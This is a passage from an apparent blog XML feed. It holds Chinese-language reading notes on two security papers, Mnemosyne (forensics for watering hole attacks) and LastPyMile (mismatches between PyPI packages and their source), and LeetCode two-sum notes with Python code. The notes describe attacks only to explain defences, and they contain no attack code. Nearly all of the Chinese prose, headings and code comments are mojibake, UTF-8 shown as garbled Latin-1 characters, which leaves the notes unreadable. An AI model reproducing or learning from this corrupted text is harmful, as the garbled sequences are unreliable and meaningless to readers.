        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PR - Mnemosyne: An Effective and Efficient Postmortem Watering Hole Attack Investigation System</title>
      <link href="/2022/03/03/Mnemosyne%20-%20An%20Effective%20and%20Efficient%20Postmortem%20Watering%20Hole%20Attack%20Investigation%20System/"/>
      <url>/2022/03/03/Mnemosyne%20-%20An%20Effective%20and%20Efficient%20Postmortem%20Watering%20Hole%20Attack%20Investigation%20System/</url>
      
        <content type="html"><![CDATA[<blockquote><p><em>åŸæ–‡ä½œè€…ï¼šJ Allen, Z Yang, M Landen, R Bhat, H Grover</em></p><p><em>åŸæ–‡æ ‡é¢˜ï¼šMnemosyne: An Effective and Efficient Postmortem Watering Hole Attack Investigation System</em></p><p><em>åŸæ–‡é“¾æ¥ï¼š<a href="https://dl.acm.org/action/doi/pdf/10.1145/3372297.3423355">https://dl.acm.org/action/doi/pdf/10.1145/3372297.3423355</a></em></p><p><em>åŸæ–‡æ¥æºï¼šCCS 2020</em></p><p><em>ç¬”è®°ä½œè€…ï¼šoutx</em></p></blockquote><h2 id="0x01-Intro"><a href="#0x01-Intro" class="headerlink" title="0x01 Intro"></a>0x01 Intro</h2><p>æœ¬æ–‡èšç„¦äºâ€œæ°´å‘æ”»å‡»â€ï¼Œå…¶é€šå¸¸ä½œä¸ºæ€ä¼¤é“¾ä¸­åˆå§‹é˜¶æ®µçš„ä¸»è¦æŠ€æœ¯ä¹‹ä¸€ï¼Œå°†ä¸€ä¸ªè¢«æ”»é™·çš„ç½‘ç«™å½“ä½œå«è„šçŸ³ä»è€Œè¿›å…¥ç›®æ ‡ç»„ç»‡ç½‘ç»œã€‚ç°æœ‰çš„ä¸€äº›ç ”ç©¶å°è¯•å°†é‚£äº›è¢«æ”»é™·çš„ç½‘ç«™ä¸æ­£å¸¸ç½‘ç«™è¿›è¡Œæ¯”è¾ƒä»¥æ‰¾å‡ºæ”»å‡»è€…æ‰€åšçš„æ¶æ„ä¿®æ”¹ï¼Œä½†ä½œè€…è®¤ä¸ºï¼Œä»…ä»…æ£€æµ‹ç½‘ç«™æ˜¯å¦è¢«æ”»é™·ä»¥åŠæ˜¯å¦è¢«æ¶æ„ä¿®æ”¹åªåŒ…æ‹¬äº†è°ƒæŸ¥è€Œä¸åŒ…æ‹¬å–è¯ã€‚</p><p>ç»è¿‡è°ƒç ”åï¼Œä½œè€…è®¤ä¸ºæ£€æµ‹æ°´å‘æ”»å‡»ä»¥åŠé‡æ„å…¶æ”»å‡»è¿‡ç¨‹ä¸»è¦æœ‰ä¸¤å¤§æŒ‘æˆ˜ï¼šä¸€æ˜¯ç°æœ‰ç”¨äºæ”»å‡»é‡æ„çš„ç³»ç»Ÿé€šå¸¸æ”¶é›†å¹¶è·Ÿè¸ªç³»ç»Ÿçº§ä¿¡æ¯æµçš„å®¡è®¡æ—¥å¿—ï¼Œå¹¶ä¸”ä¸¥é‡å€¾å‘äºä¾èµ–ä½çº§è¯­ä¹‰ï¼ŒåŒ…æ‹¬è¿›ç¨‹ã€å¥—æ¥å­—å’Œç³»ç»Ÿè°ƒç”¨ç­‰ã€‚ä½†æ­£æ˜¯å› ä¸ºå…¶å¯¹äºä½çº§è¯­ä¹‰çš„ä¾èµ–å¯¼è‡´äº†å…¶æ— æ³•å‡†ç¡®ç†è§£ä¸æµè§ˆå™¨å†…Javascriptæ‰§è¡Œæœ‰å…³çš„ç»†èŠ‚ï¼Œé™åˆ¶äº†å…¶é‡æ„å¤æ‚æ”»å‡»çš„èƒ½åŠ›ï¼›äºŒæ˜¯æ°´å‘æ”»å‡»å…·æœ‰é«˜åº¦çš„é’ˆå¯¹æ€§ï¼Œåœ¨å–è¯è°ƒæŸ¥çš„æ—©æœŸå¾ˆéš¾ç¡®å®šå“ªäº›è®¿é—®è€…æ‰æ˜¯æ”»å‡»è€…çœŸæ­£çš„ç›®æ ‡ã€‚ä½œè€…è®¤ä¸ºä»…ä»…æ˜¯æ£€æµ‹ä¸€ä¸ªç½‘ç«™æ˜¯å¦è¢«æ”»å‡»è€…æ”»é™·äº†æ˜¯ä¸å¤Ÿçš„ï¼Œå¯¹äºæ­¤ç½‘ç«™çš„è®¿é—®ç»„ç»‡æ¥è¯´ï¼Œä»–ä»¬æ›´å…³å¿ƒè¿™ä¸ªè¢«æ”»é™·çš„ç½‘ç«™åœ¨è®¿é—®æ—¶æ˜¯å¦ä¼šå¯¹ç»„ç»‡æœ‰ä½•ä¸åˆ©å½±å“ã€‚ä½†æ˜¯æƒ³è¦ç‹¬ç«‹å®Œæˆè¿™é¡¹è°ƒæŸ¥å¹¶ä¸ç®€å•ï¼Œå› ä¸ºæœåŠ¡ç«¯çš„æ—¥å¿—å¯¹äºè¿™äº›ç»„ç»‡æ¥è¯´æ˜¯é€æ˜çš„ã€‚</p><h2 id="0x02-Mnemosyne"><a href="#0x02-Mnemosyne" class="headerlink" title="0x02 Mnemosyne"></a>0x02 Mnemosyne</h2><p>ä½œè€…æå‡ºäº†Mnemosyneï¼ˆå¸Œè…Šç¥è¯ä¸­çš„è®°å¿†å¥³ç¥ï¼‰ï¼Œä¸€ä¸ªè¢«æ°´å‘æ”»å‡»åç”¨äºå–è¯åˆ†æçš„å·¥å…·ï¼Œä¾èµ–æµè§ˆå™¨ç«¯å®¡è®¡æ—¥å¿—è¿›è¡Œé‡æ„ã€è°ƒæŸ¥å’Œè¯„ä¼°æ°´å‘æ”»å‡»ï¼Œç»“æ„å¦‚ä¸‹å›¾ã€‚</p><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/86b04540-b19d-4eba-a38d-f8413e040919.png"></p><p>ç¬¬ä¸€éƒ¨åˆ†æ˜¯æµè§ˆå™¨ç«¯å®¡è®¡å®ˆæŠ¤ç¨‹åºï¼Œå®ƒè¢«éƒ¨ç½²åœ¨ç»„ç»‡çš„æ¯ä¸ªç»ˆç«¯ç³»ç»Ÿä¸Šï¼Œä»¥ç›‘æµ‹ç½‘ç»œæµè§ˆæ´»åŠ¨ã€‚å®¡è®¡å®ˆæŠ¤ç¨‹åºä¼šåœ¨æ¯ä¸ªç»ˆç«¯çš„æµè§ˆä¼šè¯ä¸­è¢«åŠ¨åœ°æ”¶é›†å®¡è®¡æ—¥å¿—ï¼Œè¿™äº›å®¡è®¡æ—¥å¿—ä¼šè¢«æ”¶é›†å¹¶å­˜å‚¨åœ¨ä¸€ä¸ªè´Ÿè´£ç»´æŠ¤å®‰å…¨å®¡è®¡ä¿¡æ¯çš„åå°æœåŠ¡å™¨ä¸Šã€‚ç¬¬äºŒéƒ¨åˆ†æ˜¯ç”¨äºè·Ÿè¸ªå’Œåˆ†æå¤–éƒ¨ç½‘ç«™è¡Œä¸ºçš„ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿï¼Œå®ƒå°†ç»“åˆç¬¬ä¸€æ­¥æ”¶é›†åˆ°çš„æµè§ˆå™¨çº§åˆ«çš„å®¡è®¡æ—¥å¿—æ¥ç¡®å®šç½‘ç«™æ˜¯ä½•æ—¶æ²¦é™·çš„ä»¥åŠæ”»å‡»è€…åšäº†å“ªäº›æ¶æ„ä¿®æ”¹ã€‚å…·ä½“æ¥è¯´ï¼Œç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿé‡ç°äº†æ²¦é™·ç½‘ç«™æ˜¯å¦‚ä½•éšç€æ—¶é—´ä¸€æ­¥æ­¥è¢«æ”»å‡»è€…æ”»é™·çš„ï¼Œè¿™èƒ½å¤Ÿå¸®åŠ©å–è¯äººå‘˜å¿«é€Ÿç¡®å®šå…¥ä¾µçª—å£æœŸã€‚æœ€åä¸€éƒ¨åˆ†æ˜¯ç”¨æˆ·çº§åˆ†ææ¨¡å—ï¼Œå®ƒåŸºäºä¸€ä¸ªå¯ç–‘ç‰ˆæœ¬åˆ—è¡¨ï¼Œåˆ¤æ–­å½“ç”¨æˆ·è®¿é—®ç½‘ç«™æ—¶ç½‘ç«™çš„è¡Œä¸ºæ˜¯å¦æ¶æ„ã€‚</p><p>é’ˆå¯¹ç¬¬ä¸€éƒ¨åˆ†æåˆ°çš„ä¸¤ä¸ªæŒ‘æˆ˜ï¼ŒMnemosyneåˆ†åˆ«ç”¨ä»¥ä¸‹æ–¹å¼è¿›è¡Œè§£å†³ï¼š</p><ol><li><p>Mnemosyneæ”¶é›†å®¡è®¡æ—¥å¿—ï¼Œä»¥æµè§ˆå™¨çº§åˆ«çš„è¯­ä¹‰æ¥æ•æ‰ä¿¡æ¯ï¼ŒåŒ…æ‹¬é¡µé¢ã€è„šæœ¬ã€åŸŸç­‰ã€‚è™½ç„¶åœ¨æ­¤ä¹‹å‰å·²æœ‰è®¸å¤šé’ˆå¯¹æµè§ˆå™¨çš„å®¡è®¡ç³»ç»Ÿï¼Œä½†å…¶ä¸­å¤šæ•°éœ€è¦å¯¹æµè§ˆå™¨æœ¬èº«è¿›è¡Œå¾ˆå¤šä¿®æ”¹ï¼Œè¿™æ ·åšåœ¨å®éªŒç¯å¢ƒä¸‹è¡¨ç°è‰¯å¥½å´ä¸é€‚ç”¨äºç°å®ä¸–ç•Œã€‚ç›¸æ¯”ä¹‹ä¸‹ï¼ŒMnemosyneä»¥ä¸€ç§æ— éœ€ä¿®æ”¹æµè§ˆå™¨çš„è½»é‡çº§æ–¹æ³•ï¼Œåˆ©ç”¨ç°æœ‰åŸºäºChromiumçš„æµè§ˆå™¨å·²æä¾›çš„è°ƒè¯•æ¥å£æ„å»ºå®¡è®¡ç³»ç»Ÿï¼Œæ›´å®¹æ˜“åœ¨ç°å®ä¸–ç•Œä¸­éƒ¨ç½²ã€‚</p></li><li><p>Mnemosyneä»¥ä¸€ç§è½»é‡çº§çš„å®¡è®¡æ–¹æ³•ï¼Œåœ¨ç”¨æˆ·çš„æµè§ˆä¼šè¯æœŸé—´è¢«åŠ¨åœ°æ”¶é›†å®¡è®¡æ—¥å¿—ã€‚ä¸ºäº†ä½¿å¾—è¿™é¡¹è°ƒæŸ¥å®¡è®¡å°½å¯èƒ½é«˜æ•ˆï¼ŒMnemosyneå¯¹æ”¶é›†åˆ°çš„å®¡è®¡æ—¥å¿—åº”ç”¨äº†ä¸€å¥—å·®å¼‚åˆ†ææ–¹æ³•ï¼Œä»¥å¿«é€Ÿç¡®å®šè¯¥ç»„ç»‡çš„å“ªäº›å‘˜å·¥æ‰æ˜¯æ”»å‡»è€…çœŸæ­£çš„ç›®æ ‡ã€‚</p></li></ol><p><strong>Techniques: Auditor Daemon</strong><br>ä½œè€…æ‰€æå‡ºçš„å®¡è®¡å®ˆæŠ¤ç¨‹åºä¸ä¼ ç»Ÿéœ€è¦ä¿®æ”¹æµè§ˆå™¨çš„ç¨‹åºä¸åŒï¼Œå…¶ä»…ä»…ä¾èµ–äºç”±Chromiumæä¾›çš„DevToolsè°ƒè¯•æ¥å£æ¥è·å–æœ‰å…³ç”¨æˆ·æµè§ˆä¼šè¯çš„ä¿¡æ¯ï¼Œå¹¶å°†å…¶ä½œä¸ºå®¡è®¡æ—¥å¿—å­˜å‚¨ä¸‹æ¥ï¼Œå…·ä½“æ•è·çš„äº‹ä»¶å¦‚ä¸‹è¡¨ã€‚</p><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/987b456c-7e13-488b-ac66-d2c7f5548bdd.png"></p><p><strong>Techniques: Browser-level Causality Graph</strong><br>ä½œä¸ºæ”»å‡»é‡æ„çš„ç¬¬ä¸€æ­¥ï¼Œä½œè€…åŸºäºæµè§ˆå™¨çº§çš„å®¡è®¡æ—¥å¿—æ„å»ºäº†å› æœå…³ç³»å›¾ï¼Œç”¨äºåˆ†æå’Œè°ƒæŸ¥ï¼Œå¦‚ä¸‹è¡¨æ‰€ç¤ºã€‚</p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/d5e890a9-a7c4-49f0-a164-53bb29dff37b.png" width="70%"/>  <img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/0ff5a0f8-ec96-43f5-92bf-6d5637aa526f.png" width="70%"/> <p>è¿™ç§å›¾å¼ç»“æ„èƒ½å¤Ÿåæ˜ å‡ºæµè§ˆå™¨äº‹ä»¶é“¾ä»¥åŠå…¶äº§ç”Ÿçš„å› æœå…³ç³»ã€‚ä»¥ç¤¾ä¼šå·¥ç¨‹æ”»å‡»ä¸ºä¾‹å­ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œä¸»è¦æœ‰ä¸‰ä¸ªé˜¶æ®µï¼šç¬¬ä¸€é˜¶æ®µæ˜¯å¯¹ç”¨æˆ·è¿›è¡ŒæŒ‡çº¹è¯†åˆ«ï¼Œä»¥ç¡®å®šæ˜¯å¦æ˜¯ç›®æ ‡ç”¨æˆ·ï¼›ç¬¬äºŒé˜¶æ®µå°è¯•æ¨¡ç³ŠåŸå§‹ç½‘ç«™çš„å†…å®¹ï¼Œåœ¨DOMä¸­æ³¨å…¥ä¸€ä¸ªæ¶æ„çš„è¦†ç›–å±‚ï¼Œå°†ç”¨æˆ·é‡å®šå‘åˆ°ä¸€ä¸ªç²¾å¿ƒä»¿ç…§è¿‡çš„ç½‘ç«™ä¸‹ï¼›ç¬¬ä¸‰é˜¶æ®µæ¬ºéª—ç”¨æˆ·è¿›è¡Œç™»é™†ç­‰æ“ä½œï¼Œä»¥è·å–ç”¨æˆ·æ•æ„Ÿæ•°æ®ã€‚</p><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/01463d84-3f8c-4020-901a-42db1e698c00.png"></p><p><strong>Techniques: Versioning System</strong>  </p><p>åŸºäºåŸŸçš„ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿå°†æ‰€æœ‰å®¢æˆ·ç«¯å®¡è®¡æ—¥å¿—ä¿¡æ¯ä¸­çš„åŸŸåä¿¡æ¯æŠ½å‡ºï¼ŒæŒ‰ç…§ä¸€å®šçš„åŠ æƒè¯„åˆ†æ–¹å¼ç»Ÿè®¡é‚£äº›ç½‘ç«™çš„å¯ç–‘ç‰ˆæœ¬ï¼Œå³å°è¯•æ‰¾å‡ºå¯ç–‘å˜åŒ–æ—¶é—´çª—å£ã€‚è¿™å¥—åŠ æƒè¯„åˆ†ç³»ç»Ÿçš„ä¸»è¦è¿ä½œæ–¹å¼æ˜¯å°†åŸºäºæµè§ˆå™¨çº§çš„å®¡è®¡æ—¥å¿—ä¸ATT&amp;CKæ¡†æ¶ä¸­ç°æœ‰çš„æ”»å‡»æ¨¡å¼ç›¸åŒ¹é…ï¼Œæ¶‰åŠçš„TTPé›†ä»¥åŠæ˜ å°„æ‰€éœ€çš„patternå¦‚ä¸‹è¡¨ã€‚</p><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/76baf8d2-b972-4c84-a62b-dd0d225bd18a.png"></p><p><strong>Techniques: User-Level Analysis</strong><br>ç”¨æˆ·çº§åˆ†æçš„ç›®çš„ä¸»è¦æ˜¯æ ¹æ®è®¿é—®ç”¨æˆ·æµè§ˆå™¨ä¸­çš„ä¼šè¯è®°å½•æ¥ç¡®å®šåŒä¸€ç½‘ç«™æ˜¯å¦åœ¨ä¸åŒç”¨æˆ·è®¿é—®æ—¶è¡¨ç°ä¸ä¸€ã€‚ä¸‹è¡¨å°±è¡¨ç°äº†æ™®é€šç”¨æˆ·è®¿é—®å’Œç›®æ ‡ç”¨æˆ·è®¿é—®æ—¶ï¼Œç½‘ç«™æ‰€è¡¨ç°å‡ºçš„åŒºåˆ«ã€‚</p><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/cd5eb4a2-ac64-42ae-8dfa-ee5f3ff8d233.png"></p><h2 id="0x03-Conclusion"><a href="#0x03-Conclusion" class="headerlink" title="0x03 Conclusion"></a>0x03 Conclusion</h2><p>ä½œè€…åœ¨ç°å®ä¸–ç•Œä¸­å°è¯•éƒ¨ç½²äº†è¿™å¥—ç³»ç»Ÿï¼Œå¹¶ä¸”å¾—åˆ°äº†ä¸€äº›æ”»å‡»åœºæ™¯åœ¨é‡æ¡ˆä¾‹ï¼Œå¦‚ä¸‹è¡¨ã€‚</p><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/2db50aec-4345-4dc0-9ec2-9c53339a75fd.png"></p><p>è¯»è€…åœ¨è¯»å®Œæ•´ç¯‡æ–‡ç« åæœ‰ä¸€ä¸ªæƒ³æ³•ï¼Œå¦‚æœè¯´æ”»å‡»è€…åœ¨æ‹¿ä¸‹äº†è¯¥ç½‘ç«™åï¼Œæ›¿æ¢æ‰å…¶ä¸­æ­£å¸¸ä¸‹è½½çš„æ–‡ä»¶ï¼Œæ¯”å¦‚æ›¿æ¢æ‰ç½‘ç«™æ­£å¸¸æä¾›ä¸‹è½½çš„ä¸€ä¸ªwordæ–‡ä»¶ã€‚é€šè¿‡è¿™ç§æ–¹å¼ä¸å°±ç»•è¿‡äº†ç³»ç»Ÿä¸­ç‰ˆæœ¬æ§åˆ¶é‚£ä¸€éƒ¨åˆ†çš„åŠ æƒè¯„åˆ†ç³»ç»Ÿä»è€Œè¢«è¯†åˆ«ä¸ºä¸€ä¸ªæ­£å¸¸çš„ç‰ˆæœ¬äº†ã€‚å½“ç„¶ï¼Œé’ˆå¯¹å¤§å¤šæ•°é€šè¿‡æ“çºµDOMå®Œæˆé¡µé¢æ›¿æ¢çš„æ”»å‡»ï¼Œæ­¤æ–¹æ³•æ€è·¯æ¸…æ™°æœ‰æ•ˆã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Paper Reading </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CCS&#39;20 </tag>
            
            <tag> Watering Hole Attack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NS - Leetcode Notes</title>
      <link href="/2022/02/24/Coding/"/>
      <url>/2022/02/24/Coding/</url>
      
        <content type="html"><![CDATA[<blockquote><p><em>ä»é›¶å¼€å§‹çš„Leetcodeåˆ·åˆ·ä¹</em></p><p><em>çœ‹å¿ƒæƒ…ç”¨Python3æˆ–è€…æ•£è£…Java</em></p><p><em>ç¬”è®°ä½œè€…ï¼šoutx</em></p><p><em>æœ€åä¸€æ¬¡æ›´æ–°äº2022-02-24</em></p></blockquote><h2 id="ä¸¤æ•°ä¹‹å’Œ"><a href="#ä¸¤æ•°ä¹‹å’Œ" class="headerlink" title="ä¸¤æ•°ä¹‹å’Œ"></a><a href="https://leetcode-cn.com/problems/two-sum/">ä¸¤æ•°ä¹‹å’Œ</a></h2><blockquote><p>ç»™å®šä¸€ä¸ªæ•´æ•°æ•°ç»„ nums å’Œä¸€ä¸ªæ•´æ•°ç›®æ ‡å€¼ targetï¼Œè¯·ä½ åœ¨è¯¥æ•°ç»„ä¸­æ‰¾å‡º å’Œä¸ºç›®æ ‡å€¼ target  çš„é‚£ ä¸¤ä¸ª æ•´æ•°ï¼Œå¹¶è¿”å›å®ƒä»¬çš„æ•°ç»„ä¸‹æ ‡ã€‚</p><p>ä½ å¯ä»¥å‡è®¾æ¯ç§è¾“å…¥åªä¼šå¯¹åº”ä¸€ä¸ªç­”æ¡ˆã€‚ä½†æ˜¯ï¼Œæ•°ç»„ä¸­åŒä¸€ä¸ªå…ƒç´ åœ¨ç­”æ¡ˆé‡Œä¸èƒ½é‡å¤å‡ºç°ã€‚</p><p>ä½ å¯ä»¥æŒ‰ä»»æ„é¡ºåºè¿”å›ç­”æ¡ˆã€‚</p><p>ç¤ºä¾‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥ï¼šnums = [2,7,11,15], target = 9</span><br><span class="line">è¾“å‡ºï¼š[0,1]</span><br></pre></td></tr></table></figure></blockquote><h3 id="æˆ‘çš„ä»£ç "><a href="#æˆ‘çš„ä»£ç " class="headerlink" title="æˆ‘çš„ä»£ç "></a>æˆ‘çš„ä»£ç </h3><p>æ€è·¯ï¼šå°±æ˜¯ä¸€ä¸ªäºŒé‡éå†ï¼Œæ˜¾ç„¶å¾ˆlow</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">twoSum</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>], target: <span class="built_in">int</span></span>) -&gt; <span class="type">List</span>[<span class="built_in">int</span>]:</span></span><br><span class="line">        <span class="keyword">for</span> pos1 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(nums)):</span><br><span class="line">            <span class="keyword">for</span> pos2 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(nums)):</span><br><span class="line">                <span class="keyword">if</span> (nums[pos1]+nums[pos2] == target) &amp; (pos1 != pos2):</span><br><span class="line">                    <span class="keyword">return</span> [pos1, pos2]</span><br></pre></td></tr></table></figure><h3 id="ä¼˜ç§€ä»£ç "><a href="#ä¼˜ç§€ä»£ç " class="headerlink" title="ä¼˜ç§€ä»£ç "></a>ä¼˜ç§€ä»£ç </h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">twoSum</span>(<span class="params">self, nums, target</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :type nums: List[int]</span></span><br><span class="line"><span class="string">        :type target: int</span></span><br><span class="line"><span class="string">        :rtype: List[int]</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        hashmap = &#123;&#125;</span><br><span class="line">        <span class="keyword">for</span> index, num <span class="keyword">in</span> <span class="built_in">enumerate</span>(nums):</span><br><span class="line">            another_num = target - num <span class="comment"># è¿™é‡Œæ˜¯æ¯”è¾ƒå¥½çš„æ€è·¯ï¼Œå…ˆæ‰¾å‡ºå¦ä¸€ä¸ªæ•°å­—æ˜¯ä»€ä¹ˆï¼Œå†ä»å…ˆå‰å­˜æ”¾è¿‡çš„æ•°å­—çš„hashmapä¸­å»æ‰¾ï¼Œè¿™æ ·åªç”¨éå†ä¸€æ¬¡å³å¯</span></span><br><span class="line">            <span class="keyword">if</span> another_num <span class="keyword">in</span> hashmap:</span><br><span class="line">                <span class="keyword">return</span> [hashmap[another_num], index]</span><br><span class="line">            hashmap[num] = index</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">      </span><br><span class="line"><span class="comment"># enumerate() å‡½æ•°ç”¨äºå°†ä¸€ä¸ªå¯éå†çš„æ•°æ®å¯¹è±¡(å¦‚åˆ—è¡¨ã€å…ƒç»„æˆ–å­—ç¬¦ä¸²)ç»„åˆä¸ºä¸€ä¸ªç´¢å¼•åºåˆ—ï¼ŒåŒæ—¶åˆ—å‡ºæ•°æ®å’Œæ•°æ®ä¸‹æ ‡ï¼Œä¸€èˆ¬ç”¨åœ¨ for å¾ªç¯å½“ä¸­</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Coding </tag>
            
            <tag> Leetcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RePR - LastPyMile: Identifying the Discrepancy between Sources and Packages</title>
      <link href="/2022/02/23/Re-LastPyMile:%20Identifying%20the%20Discrepancy%20between%20Sources%20and%20Packages/"/>
      <url>/2022/02/23/Re-LastPyMile:%20Identifying%20the%20Discrepancy%20between%20Sources%20and%20Packages/</url>
      
        <content type="html"><![CDATA[<blockquote><p><em>åŸæ–‡ä½œè€…ï¼šDuc-Ly Vu, Fabio Massacci, Ivan Pashchenko, Henrik Plate</em></p><p><em>åŸæ–‡æ ‡é¢˜ï¼šLastPyMile: Identifying the Discrepancy between Sources and Packages</em></p><p><em>åŸæ–‡é“¾æ¥ï¼š<a href="https://securitylab.disi.unitn.it/lib/exe/fetch.php?media=research_activities:experiments:esecfse2021.pdf">https://securitylab.disi.unitn.it/lib/exe/fetch.php?media=research_activities:experiments:esecfse2021.pdf</a></em></p><p><em>åŸæ–‡æ¥æºï¼šESEC/FSE 2021</em></p><p><em>ç¬”è®°ä½œè€…ï¼šoutx</em></p></blockquote><p>å¥½è®ºæ–‡å†è¯»å†å“åˆæ˜¯å¦ä¸€äº›å‘ç° - 220223</p><h2 id="0x00-Intro"><a href="#0x00-Intro" class="headerlink" title="0x00 Intro"></a>0x00 Intro</h2><p>é€šå¸¸æƒ…å†µä¸‹å¼€æºçš„è½¯ä»¶åŒ…ä¼šåœ¨å…¶å¯¹åº”çš„å­˜å‚¨åº“ä¸Šæä¾›æºä»£ç ï¼Œä½†å¼€å‘è€…å¾€å¾€æ›´å€¾å‘äºä½¿ç”¨é›†æˆå¼çš„åŒ…ç®¡ç†å™¨æ¥ä½¿ç”¨è¿™äº›å¼€æºè½¯ä»¶åŒ…ï¼ˆPyPIå¯¹åº”çš„pipï¼‰ã€‚è¿™ç§æ–¹ä¾¿çš„åšæ³•æ˜¯å‡è®¾æºä»£ç å’Œè½¯ä»¶åŒ…ä¹‹é—´æ²¡æœ‰å·®å¼‚çš„ï¼Œè¿™ä¼šå¸¦æ¥ä¸€å®šçš„å®‰å…¨é£é™©ã€‚ä½œè€…æå‡ºå¹¶å®ç°äº†ä¸€ç§æ–¹æ³•ï¼Œåä¸ºLastPyMileï¼Œä¸»è¦ç”¨äºè¯†åˆ«è½¯ä»¶åŒ…çš„æ„é€ å’Œå…¶æºä»£ç åº“ä¹‹é—´çš„å·®å¼‚ï¼Œä»¥é˜²æ­¢æ¶æ„è½¯ä»¶çš„æ³¨å…¥ã€‚</p><h2 id="0x01-Background"><a href="#0x01-Background" class="headerlink" title="0x01 Background"></a>0x01 Background</h2><p>ä½œè€…èƒŒè°ƒäº†ç›®å‰è½¯ä»¶ä¾›åº”é“¾çš„æƒ…å†µï¼Œå¤šè¾¾99%çš„ä»£ç åº“åŒ…å«å¼€æºä»£ç ï¼Œ85%åˆ°97%çš„ä¼ä¸šä»£ç åº“åŒ…å«å¼€æºä»£ç ã€‚æ­£æ˜¯å› ä¸ºå¼€æºä»£ç çš„æµè¡Œï¼Œæ–¹ä¾¿äº†å¼€å‘è€…æ ¹æ®å…·ä½“æƒ…å†µåŸºäºå…¶ä»–å¼€å‘è€…é¢„å…ˆæ„å»ºå¥½çš„å¼€æºè½¯ä»¶åŒ…è¿›è¡Œè‡ªèº«è½¯ä»¶æ„å»ºã€‚</p><p>é€šå¸¸æ¥è¯´ï¼Œè¿™äº›å¼€æºè½¯ä»¶åŒ…çš„æºä»£ç å’Œå…¶å®é™…åŒ…ä¸­çš„ä»£ç æ˜¯æ²¡æœ‰ä»»ä½•å·®å¼‚çš„ã€‚ä½†å®é™…ä¸Šï¼Œæ‰‹åŠ¨æˆ–è‡ªåŠ¨æ„å»ºå·¥å…·ï¼Œäº¦æˆ–æ˜¯å‡ºäºä¸€äº›æ¶æ„ç›®çš„ï¼Œè¿™ä¸¤è€…ä¹‹é—´æ˜¯å¯èƒ½ä¼šå­˜åœ¨ç€å·®å¼‚æ€§çš„ï¼Œå¦‚ä¸‹è¡¨ã€‚å¯ä»¥çœ‹åˆ°æ­£å¸¸è½¯ä»¶åŒ…çš„å‘å¸ƒç‰ˆæœ¬ç›¸è¾ƒäºå…¶æºä»£ç çš„å˜åŠ¨æ˜¯å¾ˆå°çš„ï¼Œè€Œæ¶æ„è½¯ä»¶åŒ…åˆ™æœ‰å¾ˆæ˜æ˜¾çš„è¯¯å·®ã€‚</p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/2b3d0c73-74d9-4a3b-a99a-e88ce8104e4d.png" width="70%" height="70%" /><p>ä½œè€…é€šè¿‡è°ƒç ”PyPIç”Ÿæ€ï¼Œç ”ç©¶äº†ä¸€ä¸ªPyPIåŒ…ä»å¼€å‘ã€æ„å»ºåˆ°å‘å¸ƒå’Œå®‰å…¨å®¡æŸ¥çš„è¿‡ç¨‹ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºã€‚å¯¹äºPyPIæ¥è¯´ï¼Œå…¶åœ¨è½¯ä»¶åŒ…åœ¨ä¸Šä¼ è¿‡ç¨‹ä¸­é€šå¸¸åªä¼šæ£€æŸ¥ä¸€ä¸ªsetup.pyæ–‡ä»¶ï¼Œä½†åœ¨çœŸå®ä¸–ç•Œä¸­ï¼Œèƒ½å¤Ÿæ³¨å…¥æ¶æ„ä»£ç çš„åœ°æ–¹è¿œè¿œä¸æ­¢setup.pyæ–‡ä»¶ã€‚</p><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/8547a72b-1ea1-45be-b4a1-ccbb992c368d.png"></p><p>ä½†ä¸è®ºå¦‚ä½•ï¼Œä»£ç æ³¨å…¥æ”»å‡»ä¸­ï¼Œè€ƒè™‘åˆ°æ³¨å…¥çš„éšè”½æ€§ï¼Œé€šå¸¸åªä¼šä¿®æ”¹åŸæœ¬ä»£ç 